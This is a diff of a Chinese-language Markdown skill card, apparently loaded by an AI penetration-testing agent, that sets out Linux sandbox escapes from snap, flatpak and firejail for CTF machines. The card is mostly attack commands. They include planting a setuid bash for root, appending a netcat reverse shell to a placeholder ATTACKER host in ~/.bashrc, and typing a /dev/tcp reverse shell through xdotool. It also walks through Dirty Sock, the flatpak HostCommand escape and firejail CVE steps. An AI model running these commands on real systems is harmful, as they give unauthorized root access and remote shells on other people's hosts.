@@ -1,10 +1,9 @@
 ---
 name: 'noncontainer-sandbox-escape'
-description: '非容器沙箱逃逸：snap (Dirty Sock/classic/接口) / flatpak (flatpak-spawn/filesystem/X11) / firejail (CVE-2022-31214 --join)。与 [[container-escape]] 互补。'
+description: '非容器沙箱逃逸：snap (Dirty Sock/classic/接口) / flatpak (flatpak-spawn/filesystem/X11) / firejail (CVE-2022-31214 --join)。与 container-escape 卡互补。'
 disable-model-invocation: true
 metadata: { domain: linux, tier: T3 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Linux 非容器沙箱逃逸
 
@@ -23,7 +22,7 @@ ps aux | grep -E 'snap|flatpak|firejail'
 
 # 你在沙箱外能跑这些 SUID 二进制吗？
 find / -perm -4000 -type f 2>/dev/null | grep -E 'snap-confine|firejail|bwrap'
-```
+```text
 
 ---
 
@@ -43,7 +42,7 @@ find / -perm -4000 -type f 2>/dev/null | grep -E 'snap-confine|firejail|bwrap'
 snap list                          # 列出安装的 snaps
 snap connections <snapname>        # 查看接口 → home/removable-media/docker?
 grep -r "confinement" /snap/*/meta/snap.yaml 2>/dev/null
-```
+```text
 
 ### 攻击路径 A：classic snap → 即时逃逸
 
@@ -51,7 +50,7 @@ grep -r "confinement" /snap/*/meta/snap.yaml 2>/dev/null
 # classic snap 无任何 sandbox，直接操作主机
 cp /bin/bash /home/user/bash && chmod u+s /home/user/bash
 # 然后宿主机执行 /home/user/bash -p → root
-```
+```text
 
 ### 攻击路径 B：home 接口已连接 → 劫持  `.profile`
 
@@ -59,7 +58,7 @@ cp /bin/bash /home/user/bash && chmod u+s /home/user/bash
 # 如果 snap 有 home 接口 → 能写用户 home 目录
 echo 'nc -e /bin/bash ATTACKER 5555' >> ~/.bashrc
 # 等用户下次登录 → reverse shell
-```
+```text
 
 ### 攻击路径 C：Dirty Sock (CVE-2019-7304) — snapd ≤ 2.37
 
@@ -70,7 +69,7 @@ echo 'nc -e /bin/bash ATTACKER 5555' >> ~/.bashrc
 python3 dirty_sockv2.py
 # → 创建 "dirty_sock" 用户 + sudo 权限
 su dirty_sock && sudo -i
-```
+```text
 
 ### 攻击路径 D：snap-confine 竞态 (CVE-2021-44731) — snapd ≤ 2.54.2
 
@@ -78,7 +77,7 @@ su dirty_sock && sudo -i
 # snap-confine 是 SUID root → 构造 mount namespace 时竞态
 # 在验证路径和 bind-mount 之间交换目标 → 把任意内容 mount 进去
 # 脚本: snap_confine_LPE.sh
-```
+```text
 
 ### 攻击路径 E：/tmp/.snap 劫持 (CVE-2026-3888)
 
@@ -86,7 +85,7 @@ su dirty_sock && sudo -i
 # systemd-tmpfiles 定期清理 /tmp/.snap (10-30天后)
 # → 攻击者重建 /tmp/.snap → 放入恶意内容
 # → 下次 snap-confine 执行时 bind-mounts 攻击者文件为 root
-```
+```text
 
 ---
 
@@ -98,7 +97,7 @@ su dirty_sock && sudo -i
 flatpak list --app --columns=application
 flatpak info --show-permissions <app-id>
 cat /run/user/$(id -u)/.flatpak/*/info 2>/dev/null
-```
+```text
 
 ### 攻击路径 A：`flatpak-spawn --host` (最常见)
 
@@ -112,7 +111,7 @@ gdbus call --session --dest org.freedesktop.Flatpak \
   --object-path /org/freedesktop/Flatpak/Development \
   --method org.freedesktop.Flatpak.Development.HostCommand \
   "['/bin/bash']" '{}' 0
-```
+```text
 
 ### 攻击路径 B：过度宽泛的文件系统权限
 
@@ -121,7 +120,7 @@ gdbus call --session --dest org.freedesktop.Flatpak \
 flatpak info -m <app> | grep filesystem
 # → home → echo payload >> ~/.bashrc
 # → host  → 写 /etc/cron.d/ 或 /usr/local/bin/
-```
+```text
 
 ### 攻击路径 C：X11 socket 滥用
 
@@ -130,7 +129,7 @@ flatpak info -m <app> | grep filesystem
 xdotool key ctrl+alt+t           # 开终端
 xdotool type 'bash -i >& /dev/tcp/IP/4444 0>&1'
 xdotool key Return
-```
+```text
 
 ### 攻击路径 D：bwrap 参数注入 (CVE-2024-32462)
 
@@ -138,7 +137,7 @@ xdotool key Return
 # Flatpak < 1.10.9 / 1.12.9 / 1.14.6
 # 通过 Background portal 接口注入 --bind 参数
 # → 任意主机路径 bind-mount 进 sandbox → 逃逸
-```
+```text
 
 ---
 
@@ -152,14 +151,14 @@ xdotool key Return
 firejail --list                    # 列出 sandbox
 cat /proc/self/status | grep NoNewPrivs  # 1=不能跑 SUID, 0=还能
 capsh --print                      # 当前 capabilities
-```
+```text
 
 ### 🔴 不是 root 的 Firejail → exit 即可
 
 ```bash
 # 非 root firejail 是自愿约束 → exit 回退到宿主机
 exit
-```
+```text
 
 ### 攻击路径 A：CVE-2022-31214 `--join` (Firejail ≤ 0.9.68)
 
@@ -180,29 +179,29 @@ firejail --join=<PID>
 
 # ④ 运行 su → PAM 永远通过 → root
 su
-```
+```text
 
 ### 攻击路径 B：ld.so.preload (CVE-2017-5180) — Firejail < 0.9.44.4
 
 ```bash
 # --private 复制 .Xauthority 时跟随 symlink
-# → 把 ~/.firenail/.Xauthority 链接到 /etc/ld.so.preload
+# → 把 ~/.firejail/.Xauthority 链接到 /etc/ld.so.preload
 # → Firejail 写自身路径到 ld.so.preload
 # → 下次 SUID 二进制启动 → 加载恶意 .so → root shell
-```
+```text
 
 ### 攻击路径 C：TOCTOU `--get`/`--put`
 
 ```bash
 # access() 和 copy_file() 之间的竞态
 # → symlink 切换 → 读 /etc/shadow
-```
+```text
 
 ---
 
 ## 通用逃逸决策树
 
-```
+```text
 你在沙箱里:
 
 ① 检测沙箱类型
@@ -227,7 +226,7 @@ su
    
 ⑤ 万用策略: mount | grep -E "/host|/run/host" → 提前挂载的主机 FS
    → cd /run/host && chroot . /bin/bash
-```
+```text
 
 **Why:** container-escape 只覆盖 Docker/K8s/LXC。CTF 中有 snap/flatpak/firejail 沙箱的 Hard 机器会被漏掉。
 **How to apply:** 拿 shell 后第一秒检测沙箱类型。classic snap / flatpak-spawn / firejail exit 都是秒逃。
